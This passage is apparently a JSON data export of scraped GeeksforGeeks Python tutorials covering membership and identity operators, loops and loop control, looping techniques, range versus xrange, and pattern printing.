different memory locations. Hence list1 and list2 refer to different objects. We can check it with id() function in python which returns the \u201cidentity\u201d of an object.The output of the third if the condition is \u201cTrue\u201d as both list1 and list3 are pointing to the same object.The output of the fourth if the condition is \u201cFalse\u201d because the concatenation of two lists always produces a new list.Python3list1 = []list2 = []\u00a0print(id(list1))print(id(list2))Output:\u00a0139877155242696\n139877155253640This shows list1 and list2 refer to different objects.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "1c5ca7ab34bbde4e747e504f652bef80",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "In this article, we are going to Python Membership and Identity Operators.Membership OperatorsMembership operators are operators used to validate the membership of a value. It tests for membership in a sequence, such as strings, lists, or tuples.\u00a0in operator: The \u2018in\u2019 operator is used to check if a value exists in a sequence or not. Evaluate to true if it finds a variable in the specified sequence and false otherwise.Python3# Python program to illustrate# Finding common member in list# using 'in' operatorlist1=[1,2,3,4,5]list2=[6,7,8,9]for item in list1:\u00a0\u00a0\u00a0\u00a0if item in list2:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"overlapping\")\u00a0\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0print(\"not overlapping\")Output:not overlappingThe same example without using in operator:Python3# Python program to illustrate# Finding common member in list# without\u00a0 using 'in' operator\u00a0#\u00a0 Define a function() that takes two listsdef overlapping(list1,list2):\u00a0\u00a0\u00a0\u00a0\u00a0c=0\u00a0\u00a0\u00a0\u00a0d=0\u00a0\u00a0\u00a0\u00a0for i in list1:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0c+=1\u00a0\u00a0\u00a0\u00a0for i in list2:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0d+=1\u00a0\u00a0\u00a0\u00a0for i in range(0,c):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for j in range(0,d):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if(list1[i]==list2[j]):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return 1\u00a0\u00a0\u00a0\u00a0return 0list1=[1,2,3,4,5]list2=[6,7,8,9]if(overlapping(list1,list2)):\u00a0\u00a0\u00a0\u00a0print(\"overlapping\")else:\u00a0\u00a0\u00a0\u00a0print(\"not overlapping\")Output:not overlapping\u2018not in\u2019 operator- Evaluates to true if it does not finds a variable in the specified sequence and false otherwise.Python3# Python program to illustrate# not 'in' operatorx = 24y = 20list = [10, 20, 30, 40, 50 ];\u00a0if ( x not in list ):\u00a0\u00a0\u00a0print(\"x is NOT present in given list\")else:\u00a0\u00a0\u00a0print(\"x is\u00a0 present in given list\")\u00a0if ( y in list ):\u00a0\u00a0\u00a0print(\"y is present in given list\")else:\u00a0\u00a0\u00a0print(\"y is NOT present in given list\")Output:x is NOT present in given list\ny is present in given listIdentity operatorsIn Python identity operators are used to determine whether a value is of a certain class or type. They are usually used to determine the type of data a certain variable contains.\u00a0There are different identity operators such as\u00a0\u2018is\u2019 operator \u2013 Evaluates to true if the variables on either side of the operator point to the same object and false otherwise.Python3# Python program to illustrate the use# of 'is' identity operatorx = 5if (type(x) is int):\u00a0\u00a0\u00a0\u00a0print(\"true\")else:\u00a0\u00a0\u00a0\u00a0print(\"false\")Output:\u00a0true\u2018is not\u2019 operator \u2013 Evaluates to false if the variables on either side of the operator point to the same object and true otherwise.Python3# Python program to illustrate the# use of 'is not' identity operatorx = 5.2if (type(x) is not int):\u00a0\u00a0\u00a0\u00a0print(\"true\")else:\u00a0\u00a0\u00a0\u00a0print(\"false\")Output:trueMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "cc104911a06132f7be94102a2e119aca",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python programming language provides following types of loops to handle looping requirements. Python provides three ways for executing the loops. While all the ways provide similar basic functionality, they differ in their syntax and condition checking time.While Loop:\u00a0In python, while loop is used to execute a block of statements repeatedly until a given a condition is satisfied. And when the condition becomes false, the line immediately after the loop in program is executed.\u00a0Syntax :while expression:\n    statement(s)\n\u00a0 \u00a0 \u00a0 \u00a0 3. All the statements indented by the same number of character spaces after a programming construct are considered to be \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 part of a single block of code. Python uses indentation as its method of grouping statements.\u00a0\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 Example:\u00a0Python# Python program to illustrate# while loopcount = 0while (count < 3):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0count = count + 1\u00a0\u00a0\u00a0\u00a0print(\"Hello Geek\")Output:\u00a0Hello Geek\nHello Geek\nHello Geek\n\nUsing else statement with while loops: As discussed above, while loop executes the block until a condition is satisfied. When the condition becomes false, the statement immediately after the loop is executed.\u00a0The else clause is only executed when your while condition becomes false. If you break out of the loop, or if an exception is raised, it won\u2019t be executed.\u00a0If else like this:Pythonif condition:\u00a0\u00a0\u00a0\u00a0# execute these statementselse:\u00a0\u00a0\u00a0\u00a0# execute these statementsand while loop like this are similarPythonwhile condition:\u00a0\u00a0\u00a0\u00a0\u00a0# execute these statementselse:\u00a0\u00a0\u00a0\u00a0\u00a0# execute these statementsPython#Python program to illustrate# combining else with whilecount = 0while (count < 3):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0count = count + 1\u00a0\u00a0\u00a0\u00a0print(\"Hello Geek\")else:\u00a0\u00a0\u00a0\u00a0print(\"In Else Block\")Output:\u00a0Hello Geek\nHello Geek\nHello Geek\nIn Else Block\n\nSingle statement while block: Just like the if block, if the while block consists of a single statement the we can declare the entire loop in a single line as shown below:Python# Python program to illustrate# Single statement while blockcount = 0while (count == 0): print(\"Hello Geek\")Note: It is suggested not to use this type of loops as it is a never ending infinite loop where the condition is always true and you have to forcefully terminate the compiler.for in Loop: For loops are used for sequential traversal. For example: traversing a list or string or array etc. In Python, there is no C style for loop, i.e., for (i=0; i<n; i++). There is \u201cfor in\u201d loop which is similar to for each loop in other languages. Let us learn how to use for in loop for sequential traversals.Syntax:for iterator_var in sequence:\n    statements(s)\n\nIt can be used to iterate over a range and iterators.Python3# Python program to illustrate# Iterating over range 0 to n-1\u00a0n = 4for i in range(0, n):\u00a0\u00a0\u00a0\u00a0print(i)Output :0\n1\n2\n3\n\nPython# Python program to illustrate# Iterating over a listprint(\"List Iteration\")l = [\"geeks\", \"for\", \"geeks\"]for i in l:\u00a0\u00a0\u00a0\u00a0print(i)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Iterating over a tuple (immutable)print(\"\\nTuple Iteration\")t = (\"geeks\", \"for\", \"geeks\")for i in t:\u00a0\u00a0\u00a0\u00a0print(i)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Iterating over a Stringprint(\"\\nString Iteration\")\u00a0\u00a0\u00a0s = \"Geeks\"for i in s :\u00a0\u00a0\u00a0\u00a0print(i)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Iterating over dictionaryprint(\"\\nDictionary Iteration\")\u00a0\u00a0d = dict()d['xyz'] = 123d['abc'] = 345for i in d :\u00a0\u00a0\u00a0\u00a0print(\"%s\u00a0 %d\" %(i, d[i]))Output:\u00a0List Iteration\ngeeks\nfor\ngeeks\n\nTuple Iteration\ngeeks\nfor\ngeeks\n\nString Iteration\nG\ne\ne\nk\ns\n\nDictionary Iteration\nxyz  123\nabc  345\n\nIterating by index of sequences: We can also use the index of elements in the sequence to iterate. The key idea is to first calculate the length of the list and in iterate over the sequence within the range of this length.\u00a0See the below example:\u00a0Python# Python program to illustrate# Iterating by index\u00a0list = [\"geeks\", \"for\", \"geeks\"]for index in range(len(list)):\u00a0\u00a0\u00a0\u00a0print list[index]Output:\u00a0geeks\nfor\ngeeks\n\nUsing else statement with for loops: We can also combine else statement with for loop like in while loop. But as there is no condition in for loop based on which the execution will terminate so the else block will be executed immediately after for block finishes execution.\u00a0Below example explains how to do this:\u00a0Python# Python program to illustrate# combining else with for\u00a0list = [\"geeks\", \"for\", \"geeks\"]for index in range(len(list)):\u00a0\u00a0\u00a0\u00a0print list[index]else:\u00a0\u00a0\u00a0\u00a0print \"Inside Else Block\"Output:\u00a0geeks\nfor\ngeeks\nInside Else Block\n\nNested Loops: Python programming language allows to use one loop inside another loop. Following section shows few examples to illustrate the concept.\u00a0Syntax:\u00a0Pythonfor iterator_var in sequence:\u00a0\u00a0\u00a0\u00a0for iterator_var in sequence:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0statements(s)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0statements(s)The syntax for a nested while loop statement in Python programming language is as follows:\u00a0Pythonwhile expression:\u00a0\u00a0\u00a0\u00a0while expression:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0statement(s)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0statement(s)A final note on loop nesting is that we can put any type of loop inside of any other type of loop. For example a for loop can be inside a while loop or vice versa.Python# Python program to illustrate# nested for loops in Pythonfrom __future__ import print_functionfor i in range(1, 5):\u00a0\u00a0\u00a0\u00a0for j in range(i):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(i, end=' ')\u00a0\u00a0\u00a0\u00a0print()Output:\u00a01\n2 2\n3 3 3\n4 4 4 4\n\nLoop Control Statements: Loop control statements change execution from its normal sequence. When execution leaves a scope, all automatic objects that were created in that scope are destroyed. Python supports the following control statements.\u00a0Continue Statement: It returns the control to the beginning of the loop.Python# Prints all letters except 'e' and 's'for letter in 'geeksforgeeks':\u00a0\u00a0\u00a0\u00a0if letter == 'e' or letter == 's':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0continue\u00a0\u00a0\u00a0\u00a0print 'Current Letter :', letter\u00a0\u00a0\u00a0\u00a0var = 10Output:\u00a0Current Letter : g\nCurrent Letter : k\nCurrent Letter : f\nCurrent Letter : o\nCurrent Letter : r\nCurrent Letter : g\nCurrent Letter : k\n\nBreak Statement: It brings control out of the loopPythonfor letter in 'geeksforgeeks':\u00a0\u00a0\u00a0\u00a0\u00a0# break the loop as soon it sees 'e'\u00a0\u00a0\u00a0\u00a0# or 's'\u00a0\u00a0\u00a0\u00a0if letter == 'e' or letter == 's':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0break\u00a0print 'Current Letter :', letterOutput:\u00a0Current Letter : e\n\nPass Statement: We use pass statement to write empty loops. Pass is also used for empty control statement, function and classes.Python# An empty loopfor letter in 'geeksforgeeks':\u00a0\u00a0\u00a0\u00a0passprint 'Last Letter :', letterOutput:\u00a0Last Letter : s\n\nHow for loop in Python works internally?Before proceeding to this section, you should have a prior understanding of Python Iterators.Firstly, lets see how a simple for loop looks like.Python3# A simple for loop example\u00a0fruits = [\"apple\", \"orange\", \"kiwi\"]\u00a0for fruit in fruits:\u00a0\u00a0print(fruit)Outputapple\norange\nkiwi\n\n\n\nHere we can see the for loops iterates over a iterable object fruits which is a list. Lists, sets, dictionary these are few iterable objects while an integer object is not an iterable object.For loops can iterate over any iterable object (example: List, Set, Dictionary, Tuple or String).Now with the help of above example lets dive deep and see what happens internally here.Make the list (iterable) an iterable object with help of iter() function.Run a infinite while loop and break only if the StopIteration is raised.In the try block we fetch the next element of fruits with next() function.After fetching the element we did the operation to be performed in with the element. (i.e print(fruit))Python3fruits = [\"apple\", \"orange\", \"kiwi\"]\u00a0# Creating an iterator object# from that iterable i.e fruitsiter_obj = iter(fruits)\u00a0# Infinite while loopwhile True:\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# getting the next item\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0fruit = next(iter_obj)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(fruit)\u00a0\u00a0except StopIteration:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# if StopIteration is raised,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# break from loop\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0breakOutputapple\norange\nkiwi\n\n\n\nWe can see that under the hood we are calling iter() and next() method.\u00a0Exercise: How to print a list in reverse order (from last to first item) using while and for in loops.This article is contributed by Ashirwad Kumar. If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.\u00a0Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "30112cfff397b4d16c0afb1b154474ec",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python programming language provides following types of loops to handle looping requirements.While LoopSyntax :\r\nwhile expression:\r\n    statement(s)\r\nIn Python, all the statements indented by the same number of character spaces after a programming construct are considered to be part of a single block of code. Python uses indentation as its method of grouping statements.# prints Hello Geek 3 Timescount = 0while (count < 3):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0count = count+1\u00a0\u00a0\u00a0\u00a0print(\"Hello Geek\")Output:Hello Geek\r\nHello Geek\r\nHello Geek\r\nSee this for an example where while loop is used for iterators. As mentioned in the article, it is not recommended to use while loop for iterators in python.\u00a0For in LoopIn Python, there is no C style for loop, i.e., for (i=0; i<n; i++). There is \u201cfor in\u201d loop which is similar to for each loop in other languages.Syntax:\r\nfor iterator_var in sequence:\r\n    statements(s)It can be used to iterate over iterators and a range.# Iterating over a listprint(\"List Iteration\")l = [\"geeks\", \"for\", \"geeks\"]for i in l:\u00a0\u00a0\u00a0\u00a0print(i)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Iterating over a tuple (immutable)print(\"\\nTuple Iteration\")t = (\"geeks\", \"for\", \"geeks\")for i in t:\u00a0\u00a0\u00a0\u00a0print(i)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Iterating over a Stringprint(\"\\nString Iteration\")\u00a0\u00a0\u00a0\u00a0s = \"Geeks\"for i in s :\u00a0\u00a0\u00a0\u00a0print(i)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Iterating over dictionaryprint(\"\\nDictionary Iteration\")\u00a0\u00a0\u00a0d = dict()\u00a0d['xyz'] = 123d['abc'] = 345for i in d :\u00a0\u00a0\u00a0\u00a0print(\"%s\u00a0 %d\" %(i, d[i]))Output:List Iteration\r\ngeeks\r\nfor\r\ngeeks\r\n\r\nTuple Iteration\r\ngeeks\r\nfor\r\ngeeks\r\n\r\nString Iteration\r\nG\r\ne\r\ne\r\nk\r\ns\r\n\r\nDictionary Iteration\r\nxyz  123\r\nabc  345\r\nWe can use for in loop for user defined iterators. See this for example.\u00a0Nested LoopsPython programming language allows to use one loop inside another loop. Following section shows few examples to illustrate the concept.Syntax:\r\nfor iterator_var in sequence:\r\n    for iterator_var in sequence:\r\n        statements(s)\r\n        statements(s)\r\nThe syntax for a nested while loop statement in Python programming language is as follows:\r\nwhile expression:\r\n    while expression: \r\n        statement(s)\r\n        statement(s)\r\nA final note on loop nesting is that we can put any type of loop inside of any other type of loop. For example a for loop can be inside a while loop or vice versa.from __future__ import print_functionfor i in range(1, 5):\u00a0\u00a0\u00a0\u00a0for j in range(i):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(i, end=' ')\u00a0\u00a0\u00a0\u00a0print()Output:1\r\n2 2\r\n3 3 3\r\n4 4 4 4Loop Control StatementsLoop control statements change execution from its normal sequence. When execution leaves a scope, all automatic objects that were created in that scope are destroyed. Python supports the following control statements.Continue StatementIt returns the control to the beginning of the loop.# Prints all letters except 'e' and 's'for letter in 'geeksforgeeks':\u00a0\u00a0\u00a0\u00a0\u00a0if letter == 'e' or letter == 's':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0continue\u00a0\u00a0\u00a0\u00a0print 'Current Letter :', letter\u00a0\u00a0\u00a0\u00a0var = 10Output:Current Letter : g\r\nCurrent Letter : k\r\nCurrent Letter : f\r\nCurrent Letter : o\r\nCurrent Letter : r\r\nCurrent Letter : g\r\nCurrent Letter : k\r\nBreak StatementIt brings control out of the loopfor letter in 'geeksforgeeks':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# break the loop as soon it sees 'e'\u00a0\u00a0\u00a0\u00a0\u00a0# or 's'\u00a0\u00a0\u00a0\u00a0if letter == 'e' or letter == 's':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0break\u00a0\u00a0print 'Current Letter :', letterOutput:Current Letter : ePass StatementWe use pass statement to write empty loops. Pass is also used for empty control statement, function and classes.# An empty loopfor letter in 'geeksforgeeks':\u00a0\u00a0\u00a0\u00a0passprint 'Last Letter :', letterOutput:Last Letter : sExercise:How to print a list in reverse order (from last to first item) using while and for in loops.This article is contributed by Ashirwad Kumar. If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed aboveMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "a2040300ac0bd6b8735fa35f0282a213",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python supports various looping techniques by certain inbuilt functions, in various sequential containers. These methods are primarily very useful in competitive programming and also in various projects which require a specific technique with loops maintaining the overall structure of code. \u00a0A lot of time and memory space is been saved as there is no need to declare the extra variables which we declare in the traditional approach of loops.Where they are used?Different looping techniques are primarily useful in the places where we don\u2019t need to actually manipulate the structure and order of the overall containers, rather only print the elements for a single-use instance, no in-place change occurs in the container. This can also be used in instances to save time.Different looping techniques using Python data structures \u00a0are:\u00a0Using enumerate(): \u00a0enumerate() is used to loop through the containers printing the index number along with the value present in that particular index.Python3# python code to demonstrate working of enumerate()\u00a0for key, value in enumerate(['The', 'Big', 'Bang', 'Theory']):\u00a0\u00a0\u00a0\u00a0print(key, value)Output:0 The\n1 Big\n2 Bang\n3 TheoryPython3# python code to demonstrate working of enumerate()\u00a0for key, value in enumerate(['Geeks', 'for', 'Geeks',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'is', 'the', 'Best',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Coding', 'Platform']):\u00a0\u00a0\u00a0\u00a0print(value, end=' ')Output:Geeks for Geeks is the Best Coding Platform Using zip():\u00a0zip() is used to combine 2 similar containers(list-list or dict-dict) printing the values sequentially. The loop exists only till the smaller container ends. A detailed explanation of zip() and enumerate() can be found here.Python3# python code to demonstrate working of zip()\u00a0# initializing listquestions = ['name', 'colour', 'shape']answers = ['apple', 'red', 'a circle']\u00a0# using zip() to combine two containers# and print valuesfor question, answer in zip(questions, answers):\u00a0\u00a0\u00a0\u00a0print('What is your {0}?\u00a0 I am {1}.'.format(question, answer))Output:What is your name?  I am apple.\nWhat is your color?  I am red.\nWhat is your shape?  I am a circle.Using iteritem():\u00a0iteritems() is used to loop through the dictionary printing the dictionary key-value pair sequentially which is used before Python 3 version.Using items(): items() performs the similar task on dictionary as iteritems() but have certain disadvantages when compared with iteritems().It is very time-consuming. Calling it on large dictionaries consumes quite a lot of time.It takes a lot of memory. Sometimes takes double the memory when called on a dictionary.Example 1:Python3# python code to demonstrate working of items()\u00a0d = {\"geeks\": \"for\", \"only\": \"geeks\"}\u00a0# iteritems() is renamed to items() in python3# using items to print the dictionary key-value pairprint(\"The key value pair using items is : \")for i, j in d.items():\u00a0\u00a0\u00a0\u00a0print(i, j)Output:The key value pair using iteritems is : \ngeeks for\nonly geeks\nThe key value pair using items is : \ngeeks for\nonly geeksExample 2:Python3# python code to demonstrate working of items()\u00a0king = {'Akbar': 'The Great', 'Chandragupta': 'The Maurya',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Modi': 'The Changer'}\u00a0# using items to print the dictionary key-value pairfor key, value in king.items():\u00a0\u00a0\u00a0\u00a0print(key, value)Output:Akbar The Great\nChandragupta The Maurya\nModi The ChangerUsing sorted(): \u00a0sorted() is used to print the container is sorted order. It doesn\u2019t sort the container but just prints the container in sorted order for 1 instance. The use of set() can be combined to remove duplicate occurrences.Example 1:Python3# python code to demonstrate working of sorted()\u00a0# initializing listlis = [1, 3, 5, 6, 2, 1, 3]\u00a0# using sorted() to print the list in sorted orderprint(\"The list in sorted order is : \")for i in sorted(lis):\u00a0\u00a0\u00a0\u00a0print(i, end=\" \")\u00a0print(\"\\r\")\u00a0# using sorted() and set() to print the list in sorted order# use of set() removes duplicates.print(\"The list in sorted order (without duplicates) is : \")for i in sorted(set(lis)):\u00a0\u00a0\u00a0\u00a0print(i, end=\" \")Output:The list in sorted order is : \n1 1 2 3 3 5 6 \nThe list in sorted order (without duplicates) is : \n1 2 3 5 6 Example 2:Python3# python code to demonstrate working of sorted()\u00a0# initializing listbasket = ['guave', 'orange', 'apple', 'pear',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'guava', 'banana', 'grape']\u00a0# using sorted() and set() to print the list#\u00a0 in sorted orderfor fruit in sorted(set(basket)):\u00a0\u00a0\u00a0\u00a0print(fruit)Output:apple\nbanana\ngrape\nguava\nguave\norange\npearUsing reversed():\u00a0reversed() is used to print the values of the container in the reversed order.\u00a0It does not reflect any changes to the original listExample 1:Python3# python code to demonstrate working of reversed()\u00a0# initializing listlis = [1, 3, 5, 6, 2, 1, 3]\u00a0\u00a0# using revered() to print the list in reversed orderprint(\"The list in reversed order is : \")for i in reversed(lis):\u00a0\u00a0\u00a0\u00a0print(i, end=\" \")Output:The list in reversed order is : \n3 1 2 6 5 3 1 Example 2:Python3# python code to demonstrate working of reversed()\u00a0# using reversed() to print in reverse orderfor i in reversed(range(1, 10, 3)):\u00a0\u00a0\u00a0\u00a0print(i)Output:7\n4\n1These techniques are quick to use and reduce coding effort. for, while loops need the entire structure of the container to be changed.These Looping techniques do not require any structural changes to the container.\u00a0They\u00a0have keywords that present the exact purpose of usage. Whereas, no pre-predictions or guesses can be made in for, while loop i.e not easily understand the purpose at a glance.Looping technique makes the code more\u00a0concise\u00a0than using for & while looping.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "45deed2b50e9b26c2d32dae84145bb05",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "The range() and xrange() are two functions that could be used to iterate a certain number of times in for loops in Python. In Python 3, there is no xrange, but the range function behaves like xrange in Python 2. If you want to write code that will run on both Python 2 and Python 3, you should use range().range() \u2013 This returns a range object (a type of iterable).xrange() \u2013 This function returns the generator object that can be used to display numbers only by looping. The only particular range is displayed on demand and hence called \u201clazy evaluation\u201c.Both are implemented in different ways and have different characteristics associated with them. The points of comparison are:\u00a0Return TypeMemoryOperation UsageSpeedReturn Typerange() returns \u2013 range object.\u00a0xrange() returns \u2013 xrange() object.\u00a0Python# Python code to demonstrate range() vs xrange()# on\u00a0 basis of return type\u00a0# initializing a with range()a = range(1,10000)\u00a0# initializing a with xrange()x = xrange(1,10000)\u00a0# testing the type of aprint (\"The return type of range() is : \")print (type(a))\u00a0# testing the type of xprint (\"The return type of xrange() is : \")print (type(x))Output:The return type of range() is : \n<type 'list'>\nThe return type of xrange() is : \n<type 'xrange'>MemoryThe variable storing the range created by range() takes more memory as compared to the variable storing the range using xrange(). The basic reason for this is the return type of range() is list and xrange() is xrange() object.\u00a0Python# Python code to demonstrate range() vs xrange()# on\u00a0 basis of memory\u00a0import sys\u00a0# initializing a with range()a = range(1,10000)\u00a0# initializing a with xrange()x = xrange(1,10000)\u00a0# testing the size of a# range() takes more memoryprint (\"The size allotted using range() is : \")print (sys.getsizeof(a))\u00a0# testing the size of x# xrange() takes less memoryprint (\"The size allotted using xrange() is : \")print (sys.getsizeof(x))Output:\u00a0The size allotted using range() is : \n80064\nThe size allotted using xrange() is : \n40Operations UsageAs range() returns the list, all the operations that can be applied on the list can be used on it. On the other hand, as xrange() returns the xrange object, operations associated to list cannot be applied on them, hence a disadvantage.Python# Python code to demonstrate range() vs xrange()# on\u00a0 basis of operations usage\u00a0# initializing a with range()a = range(1,6)\u00a0# initializing a with xrange()x = xrange(1,6)\u00a0# testing usage of slice operation on range()# prints without errorprint (\"The list after slicing using range is : \")print (a[2:5])\u00a0# testing usage of slice operation on xrange()# raises errorprint (\"The list after slicing using xrange is : \")print (x[2:5])Error:\u00a0Traceback (most recent call last):\n  File \"1f2d94c59aea6aed795b05a19e44474d.py\", line 18, in \n    print (x[2:5])\nTypeError: sequence index must be integer, not 'slice'Output:\u00a0The list after slicing using range is : \n[3, 4, 5]\nThe list after slicing using xrange is : SpeedBecause of the fact that xrange() evaluates only the generator object containing only the values that are required by lazy evaluation, therefore is faster in implementation than range().Important Points:\u00a0If you want to write code that will run on both Python 2 and Python 3, use range() as the xrange function is deprecated in Python 3.range() is faster if iterating over the same sequence multiple times.xrange() has to reconstruct the integer object every time, but range() will have real integer objects. (It will always perform worse in terms of memory however)range()xrange()Returns a list of integers.Returns a generator object.Execution speed is slowerExecution speed is faster.Takes more memory as it keeps the entire list of elements in memory.Takes less memory as it keeps only one element at a time in memory.All arithmetic operations can be performed as it returns a list.Such operations cannot be performed on xrange().In python 3, xrange() is not supported.In python 2, xrange() is used to iterate in for loops.This article is contributed by Manjeet Singh. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "5032094ae70deb346bb7840b6dd3ee4d",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "\u00a0Patterns can be printed in python using simple for loops. First outer loop is used to handle number of rows and Inner nested loop is used to handle the number of columns. Manipulating the print statements, different number patterns, alphabet patterns or star patterns can be printed.\u00a0Some of the Patterns are shown in this article.\u00a0Simple pyramid patternPython3# Python 3.x code to demonstrate star pattern\u00a0# Function to demonstrate printing patterndef pypart(n):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# outer loop to handle number of rows\u00a0\u00a0\u00a0\u00a0# n in this case\u00a0\u00a0\u00a0\u00a0for i in range(0, n):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# inner loop to handle number of columns\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# values changing acc. to outer loop\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for j in range(0, i+1):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# printing stars\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"* \",end=\"\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# ending line after each row\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"\\r\")\u00a0# Driver Coden = 5pypart(n)Output* \n* * \n* * * \n* * * * \n* * * * * Another Approach:\u00a0Using List in Python 3, this could be done in a simpler wayPython# Python 3.x code to demonstrate star pattern\u00a0# 